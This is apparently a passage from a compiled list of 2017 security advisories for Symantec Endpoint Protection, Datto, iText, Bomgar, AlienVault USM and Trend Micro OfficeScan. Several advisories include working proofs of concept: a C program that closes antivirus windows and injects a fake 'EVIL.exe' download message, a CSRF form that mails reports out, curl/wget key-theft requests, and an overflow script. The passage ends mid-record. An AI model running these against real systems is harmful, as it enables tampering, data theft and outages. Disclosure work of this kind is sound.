Denial Of Service / Message Spoof
CVE Reference:
==============
CVE-2017-6331
SSG16-041
Security Issue:
================
Symantec Endpoint Protection (SEP), does not validate where WinAPI messages comes from (lack of UIPI).
Therefore, malware can easily spoof messages to the UI or send WM_SYSCOMMAND to close
the SEP UI denying end user ability to scan / run the EP AntiVirus protection. Spoofed messages could
also potentially inform a user a scan was clean.
Unfortunately Symantecs advisory left out details of the Denial Of Service as well as minimizing the
amount of text a malware could inject into the UI which would result in compromising the integrity of the
Symantec Endpoint Protection Control Panel user interface.
References:
===========
https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20171106_00
Exploit/POC:
=============
1) Compile below C program, it targets various components of SEP, comment out what you want to send to the UI.
2) Try to open the Symantec Endpoint UI and you will be denied.
3) Or inject attacker supplied messages intructing the user the file is clean etc.
#include <windows.h>
#include <Tlhelp32.h>
#define VICTIM ""DevViewer.exe""
//By HYP3RLINX
//ISR: ApparitionSec
//Symantec EP Protection - Tamper Protection Bypass Vulnerability
//Tested successfully on Symantec 12.1.6 (12.1 RU6 MP5) build 7004 Symantec 12.1.7004.6500 Windows 7
//How: FindWindow / SendMessage Win32 API
//Impact: DOS / Integrity Compromised
//TO-DO: Get Window text for SavUI.exe and DOS to prevent AV scans.
void main(void){
while(1){
HWND hWnd = FindWindow( NULL, TEXT(""Status - Symantec Endpoint Protection""));
if(hWnd!=NULL){
//This injects arbitrary messages to SEP UI.
SetWindowText(hWnd, ""*** Important Security Update, Visit: http://PWN3D.com/EVIL.exe download and follow instructions. ***"");
//This prevents a user from being able to run AV scans and renders SEP UI useless
//SendMessage(hWnd, WM_SYSCOMMAND, SC_CLOSE, 0);
}
//HWND savUI = FindWindowEx(0, 0, ""Symantec Endpoint Protection"", 0);
HWND x = FindWindow(NULL, TEXT(""DevViewer""));
if(x!=NULL){
SendMessage(x, WM_SYSCOMMAND, SC_CLOSE, 0);
}
HWND x2 = FindWindow(NULL, TEXT(""DoScan Help""));
SendMessage(x2, WM_SYSCOMMAND, SC_CLOSE, 0);
HWND x3 = FindWindow(NULL, TEXT(""Sylink Drop""));
SendMessage(x3, WM_SYSCOMMAND, SC_CLOSE, 0);
HWND x4 = FindWindow(NULL, TEXT(""Manual Scan started on 7/8/2016""));
if(x!=NULL){
SendMessage(x4, WM_SYSCOMMAND, SC_CLOSE, 0);
}
sleep(1);
}
}
Network Access:
===============
Local
Severity:
=========
Medium
Disclosure Timeline:
=============================
Vendor Notification: July 8, 2016
Vendor acknowledged: 7/14/16
Vendor advisory : November 6, 2017
November 10, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1541,Datto Windows Agent 1.0.5.0 Remote Command Execution [CVE-2017-16673][CVE-2017-16674],,CVE-2017-16673,"Credits
=======
Brian Vincent, Michael Brumlow
Software
========
Datto Windows Agent
Vulnerability Details
=====================
Discovered: Aug 25, 2017
Type: Remote code execution as LocalSystem
Severity: Critical
Description
===========
CVE-2017-16673
Software: Datto Backup Agent for Windows, MacOS, Linux
Versions: All current versions
Datto Backup Agents rely on TLS client certificates to authenticate incoming requests. These certificates and private keys are easy to obtain, even if you are not a Datto customer. Once a single certificate and private key is obtained, it can be used to authenticate with any Datto Backup Agent. The result is that there is no effective authentication on incoming connections to Datto Backups Agents.
This means that any attacker that can establish a TCP connection on port 25566 or 25568 to a Datto Backup Agent can impersonate a Datto Appliance machine, and ""pair"" with a Datto agent, and issue requests. These requests include performing a full system image-based backup of the machine, or executing certain OS commands. A comprehensive list of requests and their capabilities is currently unknown.
CVE-2017-16674
Software: Datto Windows Agent
Versions: versions earlier than 1.0.6.0
The Datto Windows Agent attempts to whitelist only certain OS commands. In versions earlier than 1.0.6.0, this whitelist can be easily avoided. This allows arbitrary commands to be executed.
Together, these vulnerabilities result in trivial remote command execution as LocalSystem for the Datto Windows Agent in versions earlier than 1.0.6.0.
Vendor response
===============
https://www.datto.com/partner-security-update-nov2017
Vendor response correction
==========================
It is not necessary to be on the same local network to exploit these vulnerabilities. An attacker only needs to be able to establish a TCP connection to the agent to exploit these vulnerabilities.
Recommendation
==============
Ensure that you are running at least version 1.0.6.0 of the Datto Windows agent, which fixes CVE-2017-16674. For all Datto Backup Agents, set a local firewall rule to only allow incoming connections from your trusted Datto Appliance, as there is no fix for CVE-2017-16673 currently.
Proof of Concept
================
A proof of concept will not be posted at this time."
1550,CVE-2017-9096 iText XML External Entity Vulnerability,,CVE-2017-9096,"##################################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/en/research/advisories/
#
##################################################################
#
# Product: iText PDF Library
# Vendor: iText Group
# CVE ID: CVE-2017-9096
# CSNC ID: CSNC-2017-017
# Subject: XML External Entity Attack (XXE)
# Risk: Medium
# Effect: Remotely exploitable
# Author: Benjamin Bruppacher <benjamin.bruppacher compass-security com>
# Date: 2017-11-06
#
##################################################################
Introduction:
-------------
iText is a software developer toolkit that allows users to integrate PDF functionalities within their applications, processes or products.
The used XML parsers inside the library are not configured to disable external entities. This can be used for XML External Entity Attacks[1].
Affected versions:
---------
Vulnerable:
* 2.0.8
* 5.5.11
* 7.0.2
Not vulnerable:
* 5.5.12
* 7.0.3
Technical Description
---------------------
The attack can be carried out by submitting a malicious PDF to an iText application that parses XML data.
By providing a malicious XXE payloads inside the XML data that resides in the PDF, an attacker can for example extract files or forge requests on the server.
Timeline:
---------
2017-05-10: Discovery by Benjamin Bruppacher
2017-05-15: Initial vendor notification
2017-08-01: Vendor releases patch
2017-11-06: Disclosure of the advisory
References:
-----------
[1] https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing"
1571,Bomgar Remote Support - Local Privilege Escalation (CVE-2017-5996),,CVE-2017-5996,"                   Virtual Security Research, LLC.
                      https://www.vsecurity.com/
                          Security Advisory
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Advisory Name: Bomgar Remote Support - Local Privilege Escalation
 Release Date: 2017-10-26
  Application: Bomgar Remote Support
     Versions: 15.2.x before 15.2.3
               16.1.x before 16.1.5
               16.2.x before 16.2.4
     Severity: High/Medium
       Author: Robert Wessen <rwessen (a) vsecurity . com>
       Author: Mitch Kucia <mkucia (a) vsecurity . com>
Vendor Status: Update Released [2]
CVE Candidate: CVE-2017-5996
    Reference: https://www.vsecurity.com/download/advisories/20171026-1.txt
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Product Description
~-----------------~
From Bomgar's website [1]: ""The fastest, most secure way for experts to access
and support the systems that need them.""
Vulnerability Overview
~--------------------~
In mid-January, VSR identified a privilege escalation vulnerability in Bomgar
Remote Support application which can be used to escalate from any unprivileged
user to nt authority/system on Microsoft Windows 7 systems. The vulnerability
originates from an nt authority/system service being executed from a folder
with excessive permissions. The exploit requires a remote support agent to log
into the affected system.
Vulnerability Details
~-------------------~
The Bomgar Remote Support agent enables remote support personnel to establish
screen sharing, access command shell, and perform system administration tasks
on machines with the agent installed. The agent, by default, creates a service
as the Windows LocalSystem account and creates a folder at
C:ProgramDataomgar-ssc-0xhhhhhhhh (where each h is a hex character). The
agent is also executed from this folder, so the folder is included in the
Windows dynamic library loader search path. The default permissions on the
C:ProgramData folder allow all users, even unprivileged ones, to append and
write files. These permissions are inherited by sub-directories unless
explicitly overridden. These permissions are not changed during the
installation of the agent, so a DLL planting/hijack is possible.
A Trojan horse with the same name as one of the requested, but not present
libraries can be placed inside the C:ProgramDataomgar-ssc-0xhhhhhhhh folder
since this folder is writeable by all users. When a remote support person
attempts to connect to the host, the malicious library will be loaded and code
can executed as nt authority/system.
Versions Affected
~---------------~
The issue was originally discovered in version 16.1.1, although it likely
exists since at least version 14. All testing was performed exclusively on
Windows 7, however the vulnerability is suspected to be present on all
supported Windows platforms.
Vendor Response
~-------------~
The following timeline details Bomgar's response to the reported issue:
2017-02-05    VSR contacted Bomgar via several public email addresses to file a
              security report.
2017-02-06    Bomgar replied, VSR provided additional details on the
              vulnerability and Bomgar began internal triage.
2017-02-13    Bomgar confirmed reproduction and indicated a hotfix will be
              available to select customers on 2017-02-17. Patch for all
              customers will be available at a later date.
2017-03-28    Bomgar releases patch in Remote Support versions 15.2.3 [2],
              16.1.5 [3], and 16.2.4 [4].
2017-10-26    VSR advisory released.
Recommendation
~------------~
Upgrade all client installs to the latest version of Bomgar Remote Support
software as soon as possible.
Common Vulnerabilities and Exposures (CVE) Information
~----------------------------------------------------~
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2017-5996 to this issue. This is a candidate for
inclusion in the CVE list (https://cve.mitre.org), which standardizes
names for security problems.
Acknowledgments
~--------------~
Thanks to the Bomgar development team for a prompt response, confirmation, and
patch.
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
References:
1. https://www.bomgar.com/
2. https://www.bomgar.com/support/changelog/remote-support-15-2-3
3. https://www.bomgar.com/support/changelog/remote-support-16-1-5
4. https://www.bomgar.com/support/changelog/remote-support-1624
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
This advisory is distributed for educational purposes only with the sincere
hope that it will help promote public safety.  This advisory comes with
absolutely NO WARRANTY; not even the implied warranty of merchantability or
fitness for a particular purpose.  Neither Virtual Security Research, LLC nor
the author accepts any liability for any direct, indirect, or consequential
loss or damage arising from use of, or reliance on, this information.
See the VSR disclosure policy for more information on our responsible
disclosure practices:
  https://www.vsecurity.com/company/disclosure
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
     Copyright 2017 Virtual Security Research, LLC.  All rights reserved."
1591,"[RCESEC-2017-002][CVE-2017-14956] AlienVault USM v5.4.2 ""/ossim/report/wizard_email.php"" Cross-Site Request Forgery leading to Sensitive Information Disclosure",,CVE-2017-14956,"RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: AlienVault USM
Vendor URL: https://www.alienvault.com
Type: Cross-Site Request Forgery [CWE-253]
Date found: 2017-09-22
Date published: 2017-10-13
CVSSv3 Score: 6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
CVE: CVE-2017-14956
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
AlienVault USM 5.4.2 (current)
older versions may be affected too.
4. INTRODUCTION
===============
AlienVault Unified Security Management (USM) is a comprehensive approach to
security monitoring, delivered in a unified platform. The USM platform includes
five essential security capabilities that provide resource-constrained
organizations with all the security essentials needed for effective threat
detection, incident response, and compliance, in a single pane of glass.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
AlienVault USM v5.4.2 offers authenticated users the functionality to generate
and afterwards export generated compliance reports via the script located at
""/ossim/report/wizard_email.php"". Besides offering an export via a local file
download, the script does also offer the possibility to send out any report via
email to a given address (either in PDF or XLSX format).
An exemplary request to send the pre-defined report
""PCI_DSS_3_2__Vulnerability_Details"" to the email address ""email example com""
looks like the following:
https://example.com/ossim/report/wizard_email.php?extra_data=1&name=UENJX0RTU18zXzJfX1Z1bG5lcmFiaWxpdHlfRGV0YWlscw==&format=email&pdf=true&email=email example com
The base64-encoded HTTP GET ""name"" parameter can be replaced with any other
of the approx. 240 pre-defined reports, that are shipped with AlienVault USM
since they do all have hardcoded identifiers, such as:
- Alarm_Report
- Ticket_Report
- Business_and_Compliance
- HIPAA_List_of_identified_ePHI_assets
- PCI_DSS_3_2_Database_Users_Added
- VulnerabilitiesReport
etc.
Since there is no anti-CSRF token protecting this functionality, it is
vulnerable to Cross-Site Request Forgery attacks. An exemplary exploit to send
the ""PCI_DSS_3_2__Vulnerability_Details"" report as a PDF-file to
""email example com"" could look like the following:
<html>
<body>
<form action=""https://example.com/ossim/report/wizard_email.php"">
<input type=""hidden"" name=""extra&#95;data"" value=""1"" />
<input type=""hidden"" name=""name"" value=""UENJX0RTU18zXzJfX1Z1bG5lcmFiaWxpdHlfRGV0YWlscw&#61;&#61;"" />
<input type=""hidden"" name=""format"" value=""email"" />
<input type=""hidden"" name=""pdf"" value=""true"" />
<input type=""hidden"" name=""email"" value=""email&#64;example&#46;com"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
6. RISK
=======
To successfully exploit this vulnerability a user with rights to access the
compliance reports must be tricked into visiting an arbitrary website while
having an authenticated session in the application.
The vulnerability allows remote attackers to trigger a report generation and
send the report out to an arbitrary email address, which may lead to the
disclosure of very sensitive internal reporting information stored in AlienVault
USM through pre-defined reports such as:
- Alarms
- Assets Inventory
- Compliance Reports such as PCI DSS and HIPAA
- Raw Logs
- Security Events
- Security Operations
- Tickets
- User Activity
7. SOLUTION
===========
None.
8. REPORT TIMELINE
==================
2017-09-22: Discovery of the vulnerability
2017-09-22: Sent full vulnerability details to publicly listed security email
address
2016-10-01: MITRE assigns CVE-2017-14956
2017-10-03: No response from vendor, notified vendor again
2017-10-13: No response from vendor
2017-10-13: Public disclosure according to disclosure policy
9. REFERENCES
=============
https://www.rcesecurity.com/2017/10/cve-2017-14956-alienvault-usm-leaks-sensitive-compliance-information-via-csrf
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14956"
1601,Trend Micro OfficeScan v11.0 and XG (12.0)* Unauthorized NT Domain / PHP Information Disclosures CVE-2017-14085 (apparitionsec / hyp3rlinx),,CVE-2017-14085,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-14085-TRENDMICRO-OFFICESCAN-XG-REMOTE-NT-DOMAIN-PHP-INFO-DISCLOSURE.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.trendmicro.com
Product:
===========
OfficeScan
v11.0 and XG (12.0)*
Vulnerability Type:
===================
Unauthorized NT Domain Disclosure
Unauthorized PHP Information Disclosure
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
CVE Reference:
==============
CVE-2017-14085
Security Issue(s):
================
( NT Domain Disclosure )
Remote unauthenticated attackers who reach the TrendMicro OfficeScan XG application can query the networks NT domains.
NT enumeration is leaked by the web interface when it should not do so. Usually, you use NET commands so while this NT enumeration
is not high in severity, it should not return this information and especially to unauthorized users as it can aid in launching
further attacks.
( PHP Information Disclosure )
Remote unauthenticated attackers that can connect to TrendMicro OfficeScan XG application can query the PHP version and modules.
In 'analyzeWF.php"" we see get_loaded_extensions() and phpversion() calls, but session or authentication check is made.
$strAnalyzeResultHeader .= analyzeWFShowItemInfo('Current PHP version: '.phpversion());
$strAnalyzeResultHeader .= analyzeWFShowItemInfo('PHP extensions: '.implode(', ',get_loaded_extensions()));
$strAnalyzeResultHeader .= analyzeWFShowItemInfo('WGF version : '.$strVersion);
etc...
References:
===========
https://success.trendmicro.com/solution/1118372
Exploit/POC (NT Domain Disclosure):
=====================================
[root@localhost /]# curl -v -k https://VICTIM-IP:4343/officescan/console/RemoteInstallCGI/cgiGetNTDomain.exe
* About to connect() to VICTIM-IP port 4343
* Trying VICTIM-IP... connected
< HTTP/1.1 200 OK
< Pragma: no-cache
< Content-Type: text/plain;charset=utf-8
< Server: Microsoft-IIS/7.5
< X-Powered-By: ASP.NET
< Date: Thu, 01 Jun 2017 15:27:27 GMT
< Connection: close
< Content-Length: 510
{
""ERROR"" : {
""ERROR_CODE"" : 0
},
""RESPONSE"" : {
""NODES"" : [
{
""NAME"" : ""Avaya""
},
{
""NAME"" : ""Km-netprinters""
},
{
""NAME"" : ""Mshome""
},
{
""NAME"" : ""Printserver""
},
{
""NAME"" : ""MyDomain""
},
{
""NAME"" : ""Workgroup""
},
{
""NAME"" : ""Xpemb""
}
]
}
}
Exploit / POC (PHP Information Disclosure):
============================================
c:> curl -k https://VICTIM-IP:4343/officescan/console/html/widget/repository/widgetPool/wp1/interface/analyzeWF.php
HTTP/1.1 200 OK
[INI_UPDATE_SECTION]
>>>> Start Anaylze WGF : 2017-06-02 15:58:26
[INFO] Current PHP version: 7.0.6
[INFO] PHP extensions: Core, bcmath, calendar, ctype, date, filter, hash, iconv, json, mcrypt, SPL, pcre, Reflection, session, standard, mysqlnd, tokenizer, zip, zlib, libxml, dom, PDO, openssl, SimpleXML, xml, wddx, xmlreader, xmlwriter, cgi-fcgi, curl, gmp, ldap, mbstring, Phar, pdo_sqlite, soap, com_dotnet
[INFO] WGF version : 3.8
[INFO] WGF current wp in /path/to/widgetPool/config.php : wp2
[INFO] WGF is /path/to/widgets_new exists : true
[ERROR] C:WindowsTEMP check read/write permissions : failed
To solved this problem please reference document here.
etc...
Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
=====================
Vendor Notification: June 2, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1606,Trend Micro OfficeScan v11.0 and XG (12.0)* CURL (MITM) Remote Code Execution CVE-2017-14084 (apparitionsec / hyp3rlinx),,CVE-2017-14084,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-14084-TRENDMICRO-OFFICESCAN-XG-CURL-MITM-REMOTE-CODE-EXECUTION.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.trendmicro.com
Product:
========
OfficeScan
v11.0 and XG (12.0)*
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
Vulnerability Type:
===================
Man-in-the-Middle (MITM) Remote Code Execution
CVE Reference:
==============
CVE-2017-14084
Security Issue:
===============
MITM vector exists as the CURL request used by Send() function in ""HttpTalk.php"" has both CURLOPT_SSL_VERIFYPEER and CURLOPT_SSL_VERIFYHOST set to false.
CURLOPT_SSL_VERIFYPEER checks if remote certificate is valid and that you trust was issued by a CA you trust and it's genuine.
CURLOPT_SSL_VERIFYHOST checks that the cert was issued to the entity you want to talk to...
References:
===========
https://success.trendmicro.com/solution/1118372
Vulnerable code snippet...

curl_setopt($this->_objcurlHandle, CURLOPT_FOLLOWLOCATION,false);
curl_setopt($this->_objcurlHandle, CURLOPT_RETURNTRANSFER,true);
curl_setopt($this->_objcurlHandle, CURLOPT_HEADER, true);
curl_setopt($this->_objcurlHandle, CURLOPT_SSL_VERIFYHOST, 0); <=================== HERE
curl_setopt($this->_objcurlHandle, CURLOPT_SSL_VERIFYPEER, 0); <==================== THERE
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=================================
Vendor Notification: May 31, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1607,Trend Micro OfficeScan v11.0 and XG (12.0)* Unauthorized Remote Encryption Key Disclosure CVE-2017-14083 (apparitionsec / hyp3rlinx),,CVE-2017-14083,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-14083-TRENDMICRO-OFFICESCAN-XG-PRE-AUTH-REMOTE-ENCRYPTION-KEY-DISCLOSURE.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.trendmicro.com
Product:
========
OfficeScan
v11.0 and XG (12.0)*
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
Vulnerability Type:
===================
Unauthorized Encryption Key Disclosure
CVE Reference:
==============
CVE-2017-14083
Security Issue:
================
Remote unauthenticated attackers who can reach the TrendMicro OfficeScan XG application which usually runs on port 4343 can download
the OfficeScan XG encryption ""crypt.key"" file. This crypt.key is used for the OfficeScan XG encryption process.
References:
===========
https://success.trendmicro.com/solution/1118372
e.g.
In ""config.php""
/* *********************************************************
* Encryption module configurations
*/
$wfconf_wfcrypt_keyfile = dirname(__FILE__) . ""/../repository/inc/class/common/crypt/crypt.key""; <============= HERE
$wfconf_wfcrypt_algorithm = MCRYPT_RIJNDAEL_256; // MCRYPT_3DES MCRYPT_BLOWFISH MCRYPT_CAST_256 MCRYPT_DES ...
/* *********************************************************
* Framework configurations
*/
Exploit/POC:
=============
[root@localhost /]# wget --no-check-certificate https://VICTIM-IP:4343/officescan/console/html/widget/repository/inc/class/common/crypt/crypt.key
--14:59:52-- https://VICTIM-IP:4343/officescan/console/html/widget/repository/inc/class/common/crypt/crypt.key
Connecting to VICTIM-IP:4343... connected.
WARNING: cannot verify VICTIM-IP's certificate, issued by `/CN=VICTIM-IP':
Self-signed certificate encountered.
HTTP request sent, awaiting response... 200 OK
Length: 32 [application/octet-stream]
Saving to: `crypt.key'
100%[==================================================================================================>] 32 --.-K/s in 0s
14:59:52 (15.3 MB/s) - `crypt.key' saved [32/32]
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=================================
Vendor Notification: May 31, 2017
Vendor: ""hotfix in progress"". June 23, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1608,Trend Micro OfficeScan v11.0 and XG (12.0)* Unauthorized Remote Memory Corruption CVE-2017-14089 (apparitionsec / hyp3rlinx),,CVE-2017-14089,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-14089-TRENDMICRO-OFFICESCAN-XG-PRE-AUTH-REMOTE-MEMORY-CORRUPTION.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.trendmicro.com
Product:
========
OfficeScan
v11.0 and XG (12.0)*
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
Vulnerability Type:
===================
Unauthorized Remote Memory Corruption
CVE Reference:
==============
CVE-2017-14089
Security Issue:
================
Remote unauthenticated attackers that can make connection the TrendMicro OfficeScan XG application targeting the ""cgiShowClientAdm.exe""
process can cause memory corruption issues.
References:
===========
https://success.trendmicro.com/solution/1118372
Exploit/POC:
=============
import urllib,urllib2
from urllib2 import Request
print 'TrendMicro OfficeScan XG'
print 'Stack Memory Corruption POC'
print 'by hyp3rlinx '
IP=""VICTIM-IP:4343""
PAYLOAD=""A""*256
url = urllib2.Request('https://'+IP+'/officescan/console/html/cgi/cgiShowClientAdm.exe')
cookie=""Cookie: serror=0; session_expired=no; FeatureEnableState=enableAntiBody@1|enableCCFR@1|enableCfw@1|enableDcs@1|enableSorting@0|enableSpy@1|enableVirus@1|HasAvAddSvc@1|installWSS@1|enableDLP@0|sqldbMode@0|enableIPv6@1|w2ksupport@0|; stamp=2231521137; timestamp=1497360567; DisabledIds=9999.; LogonUser=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; ReadOnlyIds=8.56.; enableRba=1; key=16914202097564; session=666; LANG=en_US; PHPSESSID=WHATEVER123; lastID=34; lastTab=-1; theme=default; wf_CSRF_token=99999999999999999999999999999999; serror=0; retry=0; PHPSESSID=WHATEVERHERE; wf_CSRF_token=666; LANG=en_US; theme=default; lastID=33; lastTab=-1""
print ' sending packetz... '+ cookie
##url.add_header(""X-CSRFToken"", ""ee721b62aef83b017e8c86f52e38a411"") #<============== X-CSRFToken IS NOT EVEN NEEDED!
url.add_header(""Content-Type"", ""application/x-www-form-urlencoded; charset=utf-8"")
url.add_header(""Content-Length"", ""54"")
url.add_header(""Cookie "",cookie)
req=urllib2.urlopen(url)
res = urllib2.urlopen(req)
print res
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
====================
Vendor Notification: June 5, 2017
Vendor releases fixes / advisory : September 27, 2017
September 28, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1609,Trend Micro OfficeScan v11.0 and XG (12.0)* Unauthorized Start Remote Process Code Execution / DOS - INI Corruption CVE-2017-14086 (apparitionsec / hyp3rlinx),,CVE-2017-14086,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/CVE-2017-14086-TRENDMICRO-OFFICESCAN-XG-PRE-AUTH-START-REMOTE-PROCESS-CODE-EXECUTION-MEM-CORRUPT.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.trendmicro.com
Product:
========
OfficeScan XG
v11.0 and (12.0)*
Vulnerability Type:
===================
Unauthorized Start Remote Process Code Execution
Unauthorized Denial Of Service - INI Corruption
OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
CVE Reference:
==============
CVE-2017-14086
Security Issue:
================
Remote unauthenticated attackers who connect to the OfficeScan XG application can temporarily start the ""fcgiOfcDDA.exe"" executable
this process will run for short time before dies, server disk space may also be consumed with dump files by making continous HTTP requests.
References:
===========
https://success.trendmicro.com/solution/1118372
Exploit/POC Start Remote Process Code Execution:
================================================
c:> curl -k https://VICTIM-IP:4343/officescan/console/CGI/
HTTP response:
403 - Forbidden: Access is denied.
You do not have permission to view this directory or page using the credentials that you supplied
But, we can access it directly :)
c:> curl -v -k https://VICTIM-IP:4343/officescan/console/CGI/fcgiOfcDDA.exe
HTTP Response:
500 - Internal server error.
There is a problem with the resource you are looking for, and it cannot be displayed.
The EXE is called then runs for short time before .DMP is generated.
fcgiOfcDDA.exe.6808.dmp
The stored exception information can be accessed via .ecxr.
(568.112c): Unknown exception - code c000000d (first/second chance not available)
*** ERROR: Symbol file could not be found. Defaulted to export symbols for kernel32.dll -
eax=00000000 ebx=0014f780 ecx=00000000 edx=00000000 esi=00000002 edi=00000000
eip=77d9016d esp=0014f730 ebp=0014f7cc iopl=0 nv up ei pl zr na pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
ntdll!NtWaitForMultipleObjects+0x15:
Exploit/POC (Denial Of Service / INI Corruption):
==================================================
